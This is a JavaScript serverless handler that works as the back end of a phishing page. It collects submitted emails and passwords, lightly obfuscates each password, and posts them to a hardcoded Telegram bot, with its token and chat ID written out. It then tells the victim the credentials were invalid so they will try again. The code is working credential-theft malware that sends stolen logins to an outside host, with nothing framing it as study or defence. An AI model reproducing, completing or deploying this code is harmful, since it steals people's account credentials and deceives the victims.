export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  try {
    const { email, password } = req.body;

    // Encrypt password before sending
    const obfuscatedPassword = btoa(password.split("").reverse().join(""));

    const botToken = "7649612009:AAGz7-YLIvEEQhWBGyHmG6uhu2vPY6U-e2Q";
    const chatId = "6122984253";
    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const message = `New Login Attempt:\nEmail: ${email}\nPassword: ${obfuscatedPassword}`;

    await fetch(telegramApiUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message }),
    });

    res
      .status(200)
      .json({ status: "success", message: "Invalid credentials. Try again." });
  } catch (error) {
    res.status(500).json({ error: "Failed to send message." });
  }
}
